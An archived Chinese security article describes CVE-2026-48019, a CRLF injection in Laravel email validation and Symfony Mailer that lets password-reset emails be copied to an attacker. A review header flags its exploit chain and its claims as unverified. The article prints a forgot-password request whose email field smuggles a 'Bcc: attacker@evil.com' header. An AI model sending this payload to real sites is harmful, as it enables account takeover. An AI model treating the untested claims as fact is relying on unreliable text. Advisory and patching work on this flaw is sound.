---
cve: "CVE-2026-48019"
source: "gelusus/wxvl 公众号漏洞文库"
product: "Laravel / Symfony Mailer"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CVE-2026-48019"
referenced_identifiers: ""
identifier_role: "primary"
identifier_status: "unknown"
category_recommendation: "Web安全/开发框架"
title: "一个CRLF注入漏洞，竟能够进行密码重置邮件的操作？"
prerequisites: "来源所述条件，未列明部分仍待核：Laravel12/13claimedfixed12.60/13.10; validator/mailtransportacceptCRLF; accountlookupmapping musthold"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-ed16522e321a42e910fbcf34"
entity_id: "ve-ed16522e321a42e910fbcf34"
schema_version: "1"
---

## 核对与使用边界

- 分类更正：本文实际对象是 Laravel / Symfony Mailer，原 CMS 内容目录不能代替产品归属；只修正字段和分类建议，路径、来源和技术方法继续保留。

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：Laravel12/13claimedfixed12.60/13.10; validator/mailtransportacceptCRLF; accountlookupmapping musthold

- **结论使用边界（1）**：错误放CMS，应移开发框架Laravel并关联Symfony依赖。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **证据待核（2）**：示例邮箱带Bcc和额外@example.com，未解释如何匹配受害已注册email并触发reset，关键链缺口。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **证据待核（3）**：validateEmail片段仅filter_var与全文RFC/Symfony接受换行断言无官方补丁/源码链接支持。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **结论使用边界（4）**：30秒完成、受害无异常、SPF/DKIM均不报警是绝对化无测试数据；SPF/DKIM本来不直接判应用授权。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **事实待核（5）**：请求头/体全挤一行，修复str_replace两行无diff，需回权威源核CVE/产品/范围。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

#  一个CRLF注入漏洞，竟能够进行密码重置邮件的操作？  
原创 HeArt
                    HeArt  船山信安   2026-06-17 04:10  
  
六月，Laravel曝出一个编号CVE-2026-48019的CRLF注入漏洞，CVSS给出 8.9 分，分别影响v12.x和v13.x版本，这一次的CRLF注入，它挑了个所有人都默认忽略的安全点进行切入，带来的影响是能够进行密码重置邮件的较为危险的操作。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/dscLuiaicVquP5u5L60P74ANJaxfv17D0KQqlP1nkcSzBdfzYkNpOLekYBlwsNZffrmIY6o9zDH1HOdbr4Opxicaic294RYPGtyZgkr580qkjGk/640?wx_fmt=png&from=appmsg "")  
  
  
其中为Laravel的表单验证部分函数  
  
```
public function validateEmail($attribute, $value){    if (! is_string($value) && ! (is_object($value) && method_exists($value, '__toString'))) {        return false;    }    return filter_var($value, FILTER_VALIDATE_EMAIL) !== false;}
```  
  
  
  
漏洞的触发逻辑是比较容易的。攻击者无需登录任何账户，只需要跳转到密码重置页面，在邮箱输入框里填入下面的一点点的细节。  
  
```
POST /forgot-password HTTP/1.1Host: target.comContent-Type: application/x-www-form-urlencodedemail="victim%40example.com%0d%0aBcc%3A+attacker%40evil.com"%40example.com
```  
  
  
%0d%0a 就是 \r\n 的 URL 编码。  
  
其中Laravel的email验证规则只检查格式是否符合RFC标准，并没有剥离换行符，随后这个带着 CRLF 的地址被原样丢给Symfony Mailer 组件。Symfony的Address构造函数错误地接受了RFC-5322引用字符串中嵌有原始换行字节的邮箱地址。当邮件真正投递时，SMTP服务器看到的是两行：一行To指向原收件人；一行Bcc悄悄指向攻击者。  
  
从打开密码重置页面到攻击者邮箱收到同一封密码重置链接，整个过程不超过30秒。在操作期间，受害者收件箱里一切正常，没有任何异常提示。这才是最令人不安的地方。  
  
同时攻击者利用的是应用自身可信的邮件基础设施，因此，那些反垃圾系统、SPF、DKIM通通不会触发任何的警报。  
  
而官方给出的修复思路是在email验证规则里加了两行str_replace，把 \r 和 \n在传给Symfony之前直接剥掉。补丁也是Laravel v12.60.0 和v13.10.0发布。  
  
对于其依赖链的信任边界，大概是这几年反复踩的同一个坑了，出现的问题，能早点打补丁就尽早打。  
  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
